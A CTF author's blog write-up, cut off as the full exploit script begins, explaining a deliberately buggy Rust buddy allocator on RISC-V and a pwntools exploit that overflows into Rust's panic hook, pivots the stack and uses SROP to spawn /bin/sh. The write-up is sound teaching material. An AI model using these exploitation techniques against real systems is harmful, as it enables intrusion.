@@ -1,0 +1,1177 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Challenges I Wrote For BtSCTF 2025 | poni’s blog</title>
+<meta name="generator" content="Jekyll v3.9.2" />
+<meta property="og:title" content="Challenges I Wrote For BtSCTF 2025" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Challenges I wrote for BreakTheSyntax CTF 2025" />
+<meta property="og:description" content="Challenges I wrote for BreakTheSyntax CTF 2025" />
+<link rel="canonical" href="https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/rust/risc-v/2025/05/11/Challenges-I-Wrote-For-BtS-CTF-2025.html" />
+<meta property="og:url" content="https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/rust/risc-v/2025/05/11/Challenges-I-Wrote-For-BtS-CTF-2025.html" />
+<meta property="og:site_name" content="poni’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-05-11T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Challenges I Wrote For BtSCTF 2025" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-05-11T00:00:00+00:00","datePublished":"2025-05-11T00:00:00+00:00","description":"Challenges I wrote for BreakTheSyntax CTF 2025","headline":"Challenges I Wrote For BtSCTF 2025","mainEntityOfPage":{"@type":"WebPage","@id":"https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/rust/risc-v/2025/05/11/Challenges-I-Wrote-For-BtS-CTF-2025.html"},"url":"https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/rust/risc-v/2025/05/11/Challenges-I-Wrote-For-BtS-CTF-2025.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://poniponiponiponiponiponiponiponiponi.github.io/feed.xml" title="poni&apos;s blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">poni&#39;s blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/about/software">Software I use and why</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Challenges I Wrote For BtSCTF 2025</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2025-05-11T00:00:00+00:00" itemprop="datePublished">May 11, 2025
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="challenges-i-wrote-for-breakthesyntax-ctf-2025">Challenges I wrote for BreakTheSyntax CTF 2025</h1>
+
+<h2 id="arrrocator">aRRRocator</h2>
+
+<p>Congrats to kalmarunionen and valgrind for solving the challenge!</p>
+
+<h3 id="reversing-and-finding-the-bug">Reversing and finding the bug</h3>
+
+<p>This challenge is a simple memory allocator, called a buddy allocator, written in Rust and compiled to Risc-V. I found this to be a cool idea that I’m proud of because it’s one of the rare cases where using unsafe Rust is very natural, so there isn’t just a bunch of unsafes for the challenge’s sake. There’s isn’t much functionality in the program: you can write to a buffer (called a flag) and you can free it. That’s all. This is how it looks like:</p>
+
+<p><img src="https://github.com/user-attachments/assets/578fd3c2-ef42-4a7c-b273-693f45b287bd" alt="image" /></p>
+
+<p>and the non-allocator related logic:</p>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">fn</span> <span class="nf">get_flag</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="o">&amp;</span><span class="nv">'static</span> <span class="k">mut</span> <span class="p">[</span><span class="nb">u8</span><span class="p">]</span> <span class="p">{</span>
+    <span class="nd">print!</span><span class="p">(</span><span class="s">"Length: "</span><span class="p">);</span>
+    <span class="nn">io</span><span class="p">::</span><span class="nf">stdout</span><span class="p">()</span><span class="nf">.flush</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">line</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+    <span class="nn">io</span><span class="p">::</span><span class="nf">stdin</span><span class="p">()</span><span class="nf">.read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">line</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">length</span> <span class="o">=</span> <span class="n">line</span><span class="nf">.trim</span><span class="p">()</span><span class="nf">.parse</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+
+    <span class="k">let</span> <span class="n">flag_mem</span> <span class="o">=</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">length</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
+
+    <span class="nd">print!</span><span class="p">(</span><span class="s">"Write your own flag: "</span><span class="p">);</span>
+    <span class="nn">io</span><span class="p">::</span><span class="nf">stdout</span><span class="p">()</span><span class="nf">.flush</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0u8</span><span class="p">;</span> <span class="mi">4096</span><span class="p">];</span>
+    <span class="k">let</span> <span class="n">bytes_read</span> <span class="o">=</span> <span class="nn">io</span><span class="p">::</span><span class="nf">stdin</span><span class="p">()</span><span class="nf">.read</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">buffer</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="mi">0</span><span class="o">..</span><span class="n">bytes_read</span> <span class="p">{</span>
+        <span class="n">flag_mem</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="n">flag_mem</span>
+<span class="p">}</span>
+
+<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nf">init</span><span class="p">();</span>
+    
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱"</span><span class="p">);</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱  FLAG  ALLOCATOR  🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱"</span><span class="p">);</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇯🇵🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱"</span><span class="p">);</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱  EVERYONE GETS A FLAG !!!  🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱"</span><span class="p">);</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱🇵🇱"</span><span class="p">);</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"🇵🇱                                             🇵🇱"</span><span class="p">);</span>
+    
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">flag</span> <span class="o">=</span> <span class="nb">None</span><span class="p">;</span>
+    <span class="k">loop</span> <span class="p">{</span>
+        <span class="nd">println!</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
+        <span class="nf">menu</span><span class="p">();</span>
+        
+        <span class="k">let</span> <span class="k">mut</span> <span class="n">line</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+        <span class="nn">io</span><span class="p">::</span><span class="nf">stdin</span><span class="p">()</span><span class="nf">.read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">line</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
+        <span class="k">let</span> <span class="n">choice</span><span class="p">:</span> <span class="nb">i32</span> <span class="o">=</span> <span class="n">line</span><span class="nf">.trim</span><span class="p">()</span><span class="nf">.parse</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+        <span class="k">match</span> <span class="n">choice</span> <span class="p">{</span>
+            <span class="mi">1</span> <span class="k">=&gt;</span> <span class="p">{</span>
+                <span class="n">flag</span> <span class="o">=</span> <span class="nf">Some</span><span class="p">(</span><span class="nf">get_flag</span><span class="p">());</span>
+            <span class="p">},</span>
+            <span class="mi">2</span> <span class="k">=&gt;</span> <span class="p">{</span>
+                <span class="nf">free</span><span class="p">(</span><span class="n">flag</span><span class="nf">.as_mut</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">());</span>
+            <span class="p">},</span>
+            <span class="mi">_</span> <span class="k">=&gt;</span> <span class="p">{</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Additionally, I compiled the binary with no-PIC. There are no leaks so we can only use the addresses of our Rust binary.</p>
+
+<p>If you don’t know what a buddy allocator is or how it works, I found <a href="https://youtu.be/DRAHRJEAEso">this to be a good resource</a>.
+In short, it’s an allocation scheme where you can image it as a binary tree, where each level represents some power of two size of our memory space that is designated for allocation. If you have some competitive programming background, it resembles a <a href="https://cp-algorithms.com/data_structures/segment_tree.html">segment tree</a>. In fact, I based my implementation on the video above and segment trees with how I store the tree and propagate the values. My implementation is very bad, and not only because it includes bugs to be exploited, it’s also pretty slow and not memory efficient at all.</p>
+
+<p><img src="https://github.com/user-attachments/assets/aae90724-4182-4c2e-8c4b-ca5c31d3d524" alt="image" /></p>
+
+<p>We have three arrays in the program.
+A TREE array that stores information about each node, a FREE array that stores a doubly linked list of free nodes at each level, and a MEM array that represents the memory to be allocated.</p>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">#[derive(Clone,</span> <span class="nd">Copy)]</span>
+<span class="k">struct</span> <span class="n">Node</span> <span class="p">{</span>
+    <span class="n">mem</span><span class="p">:</span> <span class="o">*</span><span class="k">mut</span> <span class="nb">u8</span><span class="p">,</span>
+    <span class="n">idx</span><span class="p">:</span> <span class="nb">usize</span><span class="p">,</span>
+    <span class="n">depth</span><span class="p">:</span> <span class="nb">usize</span><span class="p">,</span>
+    <span class="n">next</span><span class="p">:</span> <span class="nb">Option</span><span class="o">&lt;</span><span class="nb">usize</span><span class="o">&gt;</span><span class="p">,</span>
+    <span class="n">prev</span><span class="p">:</span> <span class="nb">Option</span><span class="o">&lt;</span><span class="nb">usize</span><span class="o">&gt;</span><span class="p">,</span>
+    <span class="n">is_used</span><span class="p">:</span> <span class="nb">bool</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="k">mut</span> <span class="n">TREE</span><span class="p">:</span> <span class="p">[</span><span class="n">Node</span><span class="p">;</span> <span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="n">Node</span> <span class="p">{</span>
+    <span class="n">mem</span><span class="p">:</span> <span class="nn">ptr</span><span class="p">::</span><span class="nf">null_mut</span><span class="p">(),</span>
+    <span class="n">idx</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="n">depth</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="n">next</span><span class="p">:</span> <span class="nb">None</span><span class="p">,</span>
+    <span class="n">prev</span><span class="p">:</span> <span class="nb">None</span><span class="p">,</span>
+    <span class="n">is_used</span><span class="p">:</span> <span class="k">false</span><span class="p">,</span>
+<span class="p">};</span> <span class="mi">64</span><span class="p">];</span>
+
+<span class="k">static</span> <span class="k">mut</span> <span class="n">FREE</span><span class="p">:</span> <span class="p">[</span><span class="nb">Option</span><span class="o">&lt;</span><span class="nb">usize</span><span class="o">&gt;</span><span class="p">;</span> <span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="nb">None</span><span class="p">;</span> <span class="mi">7</span><span class="p">];</span>
+
+<span class="k">static</span> <span class="k">mut</span> <span class="n">MEM</span><span class="p">:</span> <span class="p">[</span><span class="nb">u8</span><span class="p">;</span> <span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0u8</span><span class="p">;</span> <span class="mi">1024</span><span class="p">];</span>
+</code></pre></div></div>
+
+<p>To get the overflow, we allocate a flag of the size 1024, we free it, and now we can allocate a flag of the size 2048. The bug is in the free function:</p>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">fn</span> <span class="nf">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="p">[</span><span class="nb">u8</span><span class="p">])</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">idx</span> <span class="o">=</span> <span class="nf">ptr_to_idx</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">depth</span> <span class="o">=</span> <span class="nf">size_to_depth</span><span class="p">(</span><span class="n">ptr</span><span class="nf">.len</span><span class="p">());</span>
+    <span class="k">unsafe</span> <span class="p">{</span>
+        <span class="k">loop</span> <span class="p">{</span>
+            <span class="n">TREE</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="py">.is_used</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+            <span class="k">let</span> <span class="n">l</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
+            <span class="k">let</span> <span class="n">r</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">^</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="k">if</span> <span class="o">!</span><span class="n">TREE</span><span class="p">[</span><span class="n">l</span><span class="p">]</span><span class="py">.is_used</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">TREE</span><span class="p">[</span><span class="n">r</span><span class="p">]</span><span class="py">.is_used</span> <span class="p">{</span>
+                <span class="nf">unlink</span><span class="p">(</span><span class="n">TREE</span><span class="p">[</span><span class="n">l</span><span class="p">]</span><span class="py">.idx</span><span class="p">);</span>
+                <span class="nf">unlink</span><span class="p">(</span><span class="n">TREE</span><span class="p">[</span><span class="n">r</span><span class="p">]</span><span class="py">.idx</span><span class="p">);</span>
+
+                <span class="n">idx</span> <span class="o">/=</span> <span class="mi">2</span><span class="p">;</span>
+                <span class="n">depth</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
+                <span class="nf">link</span><span class="p">(</span><span class="n">idx</span><span class="p">);</span>
+                <span class="k">if</span> <span class="n">depth</span> <span class="o">&lt;=</span> <span class="mi">1</span> <span class="p">{</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nf">link</span><span class="p">(</span><span class="n">idx</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The check <code class="language-plaintext highlighter-rouge">if depth &lt;= 1 { break; }</code> is done after the first merge is done, so when we start at the root node, it still assumes it has a buddy, even though it doesn’t. In the tree I start my indexing from 1 because it makes the math easier, but it also has this nice property that we have an unused phantom-node at index 0. You can even say it’s two nodes in one, because it’s the buddy of node 1, and it’s also the parent of node 1. To visually this, the tree looks kinda like this, where each node number is its index in the TREE array.</p>
+
+<p><img src="https://github.com/user-attachments/assets/ee9d5db4-48f9-4951-995d-f527b53ac060" alt="image" /></p>
+
+<p>This gives us a strong primitive of a 1024-byte long overflow in the binary section with global variables.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Exploit the bug in the memory allocator to get a strong primitive
+</span>    <span class="c1"># of a 1024-byte long overflow.
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"gimme"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Length"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1024"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"flag:"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"gimme"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"gimme"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Length"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2048"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>If we inspect the memory, we can see that the rust compiler nicely placed for us some useful structs after our MEM array.</p>
+
+<p><img src="https://github.com/user-attachments/assets/7cb97fd7-32a8-42db-a4b7-649a3865fbfd" alt="image" /></p>
+
+<p>We can see in the Rust’s source code that HOOK <a href="https://stdrs.dev/nightly/x86_64-unknown-linux-gnu/std/panicking/static.HOOK.html">is an enum Hook wrapped around in a RwLock&lt;&gt;</a></p>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">enum</span> <span class="n">Hook</span> <span class="p">{</span>
+    <span class="n">Default</span><span class="p">,</span>
+    <span class="nf">Custom</span><span class="p">(</span><span class="nb">Box</span><span class="o">&lt;</span><span class="n">dyn</span> <span class="nf">Fn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PanicInfo</span><span class="o">&lt;</span><span class="nv">'_</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">+</span> <span class="n">Sync</span> <span class="o">+</span> <span class="nb">Send</span> <span class="o">+</span> <span class="nv">'static</span><span class="o">&gt;</span><span class="p">),</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>From an exploitation point of view the only things we need to care about are that: at offset +0 we should write zeroes, otherwise we might get a deadlock, at offset +8 seems like there’s nothing useful, at offset +16 there is the argument to our function that will be stored in register a0, at offest +24 there’s a pointer to some struct at has a function pointer at offset +0x28.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Address where `do_pivot` is. `rust_panic_with_hook` reads this address
+</span>    <span class="c1"># and jumps to whatever function pointer is in there.
+</span>    <span class="n">mem_addr</span> <span class="o">=</span> <span class="mh">0x614f8</span>
+    
+    <span class="n">syscall_plt</span> <span class="o">=</span> <span class="mh">0x121a0</span>
+    <span class="c1"># Syscall numbers.
+</span>    <span class="n">sigret</span> <span class="o">=</span> <span class="mh">0x8b</span>
+    <span class="n">execve</span> <span class="o">=</span> <span class="mh">0xdd</span>
+
+    <span class="c1"># Distance from sp to the beg of memory we control is 0x450 (1104).
+</span>    <span class="c1"># The sp pivot is `addi    sp,sp,1296`.
+</span>    <span class="n">sp_pivot</span> <span class="o">=</span> <span class="mh">0x1a2b2</span>
+
+    <span class="n">mem_start</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sp_pivot</span><span class="p">)</span>
+
+    <span class="c1"># We overwrite std::panicking::HOOK with this.
+</span>    <span class="n">overflow</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">128</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="mh">0x414141</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sigret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mem_addr</span><span class="o">-</span><span class="mh">0x28</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After doing the overflow, our memory will look like this:</p>
+
+<p><img src="https://github.com/user-attachments/assets/29dfb833-3ae8-48b0-adc6-72f8b7716e3a" alt="image" /></p>
+
+<p>It’s probably a good time to dive-in into the basics of the Risc-V architecture.
+The most important thing to note is that a ret at the the end of a gadget is a lie - it’s a pseudo-instruction. In reality, Risc-V doesn’t have a ret and this is equal to a jmp to whatever is stored in the ra register. This makes Risc-V exploitation much harder than on x86 since we need gadgets that not only have a ret at the end, but also something that pops the ra value, or moves, or something (or does a jmp to some other register value). Another thing that limits possible gadgets is that instruction are of the same size and aligned, so we can’t just jump to the middle of some instruction opcode.
+Copied <a href="https://chalkiadakis.me/posts/hack-a-sat-23/riscv-pwn/">from some other writeup</a>, this is what all the registers are and what is their purpose:</p>
+
+<p><img src="https://github.com/user-attachments/assets/97738ae2-3d11-48b7-bb28-009faf6c9b88" alt="image" /></p>
+
+<p>To make syscalls we execute the ecall instruction, which stores the syscall number in the a7 register and all the arguments in a0 to a5. If you want to know more about Risc-V I recommend the writeup linked above.</p>
+
+<p>Alright, so this is the stackpivot gadget we jump to in our overflow:</p>
+
+<p><img src="https://github.com/user-attachments/assets/56a5a2ae-7ec9-4c86-b7e9-25286f5752bc" alt="image" /></p>
+
+<p>During the execution of our stackpivot we can see that sp is equal to 0x7893162c7b00 and bufor we control on the stack start at 0x7893162c7f48, so we have a distance of 0x448 bytes (or 1096 in decimal). This is what we use the stack pivot for, so sp is at a value we control so we can perform a rop chain, in this case an srop.</p>
+
+<p>I spent a lot of time trying to get the control of a7 to make a syscall (either execve or sigreturn), but In the end I failed. This is where I had the realization that our rust binary is still linked against libc and I checked the GOT.</p>
+
+<p><img src="https://github.com/user-attachments/assets/2cb18601-b6ac-4eff-afdb-a2abb2619949" alt="image" /></p>
+
+<p>We can see a syscall function! Bingo! Since we control a0, and a syscall function declaration looks probably something like int syscall(int syscall_num, int arg0, …); we control the first argument to it from our panicking hook. So we control the syscall number, we can execute the syscall sigreturn and perform sigreturn oriented programming! And in fact, after disassembling the function this turns out to be true.</p>
+
+<p><img src="https://github.com/user-attachments/assets/b44a2e4d-49ee-4c47-8e5e-890fcdcf6843" alt="image" /></p>
+
+<p>If you dont know what an SROP is,
+<a href="https://en.wikipedia.org/wiki/Sigreturn-oriented_programming">it’s a special technique that uses the sigreturn syscall to get control of all the registers</a>. You can image the syscall as a function that pops all the registers from the stack, and I mean all of them. This sounds great but might be a little bit annoying since we have to set the stack etc to values that makes sense. We will use it to call the execve syscall with all proper registers set.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># The offset 184 is where return address after stack pivot happens to be.
+</span>    <span class="n">do_pivot</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+        <span class="mi">184</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_plt</span><span class="p">)</span>
+    <span class="p">})</span>
+
+    <span class="c1"># Syscall gadget.
+</span>    <span class="n">ecall</span> <span class="o">=</span> <span class="mh">0x000000000005068c</span>
+    
+    <span class="n">srop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+        <span class="c1"># pc
+</span>        <span class="mi">304</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">ecall</span><span class="p">),</span>
+        <span class="c1"># a0-2
+</span>        <span class="mi">384</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">0</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x061600</span><span class="p">),</span> <span class="c1"># Address of /bin/sh.
+</span>        <span class="mi">384</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">1</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+        <span class="mi">384</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">2</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+        <span class="c1"># a7
+</span>        <span class="mi">384</span><span class="o">+</span><span class="mi">7</span><span class="o">*</span><span class="mi">8</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">execve</span><span class="p">),</span>
+        <span class="c1"># gp
+</span>        <span class="mi">328</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">),</span>
+        <span class="c1"># tp
+</span>        <span class="mi">336</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x42</span><span class="p">),</span>
+        <span class="c1"># sp
+</span>        <span class="mi">320</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x43</span><span class="p">),</span>
+        <span class="c1"># ra
+</span>        <span class="mi">312</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x44</span><span class="p">),</span>
+        <span class="c1"># /bin/sh
+</span>        <span class="mi">64</span><span class="p">:</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
+    <span class="p">})</span>
+    <span class="n">srop</span> <span class="o">=</span> <span class="n">srop</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">1024</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">mem_start</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">do_pivot</span><span class="p">),</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xcc</span><span class="s">"</span><span class="p">)</span>
+    
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"flag:"</span><span class="p">,</span> <span class="n">mem_start</span> <span class="o">+</span> <span class="n">do_pivot</span> <span class="o">+</span> <span class="n">srop</span> <span class="o">+</span> <span class="n">overflow</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>… and after executing the execve syscall we get a shell ;). Because we overwrote the panic handler, we need to get somehow trigger a panic. For example we can sent a random input to the int parsing function.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"gimme"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Length"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"asd"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"cat flag"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="full-exploit">Full exploit</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./arrrocator_patched"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s">"alacritty -e"</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
